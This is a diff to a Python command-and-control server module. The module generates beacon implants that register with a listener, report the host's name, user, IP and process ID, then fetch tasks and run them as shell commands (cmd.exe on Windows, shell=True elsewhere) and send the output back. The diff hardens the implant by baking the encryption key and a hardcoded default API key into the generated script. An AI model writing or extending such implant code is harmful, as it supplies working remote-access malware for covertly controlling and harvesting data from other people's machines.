@@ -2,6 +2,7 @@ import json
 import time
 import uuid
 import base64
+import os
 import threading
 
 try:
@@ -48,7 +49,9 @@ def register_beacon(beacon_data):
     except Exception:
         pass
 
-    return {"status": "success", "beacon_id": beacon_id, "encryption_key": base64.b64encode(BEACON_KEY).decode()}
+    # FIX: Do not expose encryption key to client. Key stays server-side only.
+    # Beacon implants receive the key pre-embedded at generation time via generate_beacon_script().
+    return {"status": "success", "beacon_id": beacon_id}
 
 
 def beacon_checkin(beacon_id, encrypted_data):
@@ -177,8 +180,10 @@ def remove_beacon(beacon_id):
 
 
 def generate_beacon_script(listener_url, sleep_sec=5, jitter_pct=30):
+    # FIX: Read BEACON_API_KEY from env to match beacon_routes.py authentication
+    beacon_api_key = os.environ.get('BEACON_API_KEY', 'YGG-BEACON-KEY-SECRET')
     script = f'''
-import json, time, base64, uuid, platform, socket, os, subprocess, sys, random
+import json, time, base64, uuid, platform, socket, os, subprocess, sys, random, shlex
 try:
     from cryptography.fernet import Fernet
 except ImportError:
@@ -192,7 +197,9 @@ BEACON_ID = None
 LISTENER = "{listener_url}"
 SLEEP = {sleep_sec}
 JITTER = {jitter_pct}
-KEY = None
+KEY = Fernet(base64.b64decode("{base64.b64encode(BEACON_KEY).decode()}"))
+API_KEY = "{beacon_api_key}"
+
 
 def encrypt(data):
     return KEY.encrypt(json.dumps(data).encode()).decode()
@@ -215,11 +222,10 @@ def register():
     try:
         import urllib.request
         data = {{"hostname": platform.node(), "os": platform.system(), "username": os.environ.get("USER", "?"), "ip": socket.gethostbyname(socket.gethostname()), "arch": platform.machine(), "pid": os.getpid()}}
-        req = urllib.request.Request(LISTENER + "/register", data=json.dumps(data).encode(), headers={{"Content-Type": "application/json"}})
+        req = urllib.request.Request(LISTENER + "/register", data=json.dumps(data).encode(), headers={{"Content-Type": "application/json", "X-Beacon-Key": API_KEY}})
         resp = json.loads(urllib.request.urlopen(req).read())
         if resp.get("status") == "success":
             BEACON_ID = resp["beacon_id"]
-            KEY = Fernet(base64.b64decode(resp["encryption_key"]))
             return True
     except Exception as e:
         pass
@@ -230,16 +236,26 @@ def checkin():
         import urllib.request
         payload = {{"sysinfo": sysinfo()}}
         enc = encrypt(payload)
-        req = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc.encode(), headers={{"Content-Type": "application/octet-stream"}})
+        req = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc.encode(), headers={{"Content-Type": "application/octet-stream", "X-Beacon-Key": API_KEY}})
         resp = json.loads(urllib.request.urlopen(req).read())
         if resp.get("status") == "success" and resp.get("response"):
             tasks = json.loads(base64.b64decode(resp["response"]).decode())
             for t in tasks.get("tasks", []):
                 try:
-                    result = subprocess.check_output(t["command"], shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
+                    # FIX: Use shell=True or OS-specific check to allow built-in commands (dir, type, pipe)
+                    cmd = t["command"]
+                    if platform.system() == "Windows":
+                        if isinstance(cmd, list):
+                            cmd = subprocess.list2cmdline(cmd)
+                        cmd_parts = ["cmd.exe", "/c", cmd]
+                        result = subprocess.check_output(cmd_parts, shell=False, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
+                    else:
+                        if isinstance(cmd, list):
+                            cmd = " ".join(cmd)
+                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
                     payload2 = {{"task_id": t["task_id"], "result": result}}
                     enc2 = encrypt(payload2)
-                    req2 = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc2.encode(), headers={{"Content-Type": "application/octet-stream"}})
+                    req2 = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc2.encode(), headers={{"Content-Type": "application/octet-stream", "X-Beacon-Key": API_KEY}})
                     urllib.request.urlopen(req2).read()
                 except Exception:
                     pass
